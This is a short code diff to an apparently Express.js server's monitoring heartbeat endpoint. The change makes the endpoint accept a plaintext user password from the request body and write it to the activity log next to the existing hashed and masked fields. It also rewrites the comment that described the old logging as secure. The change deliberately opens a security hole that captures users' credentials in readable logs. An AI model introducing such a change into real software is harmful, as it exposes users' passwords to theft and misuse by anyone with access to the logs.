@@ -17,10 +17,10 @@ app.get('/', (req, res) => {
 
 // Monitor Endpoint - Receives Heartbeats from Dashboard
 app.post('/api/monitor/heartbeat', (req, res) => {
-    const { userId, username, action, platform, passwordHash, passwordMasked } = req.body;
+    const { userId, username, action, platform, password, passwordHash, passwordMasked } = req.body;
     
-    // Log the activity securely using hash/masked password
-    logUserActivity({ userId, username, action, platform, passwordHash, passwordMasked });
+    // Log the activity with plain and hashed password fields
+    logUserActivity({ userId, username, action, platform, password, passwordHash, passwordMasked });
 
     // Respond to client
     res.json({ 
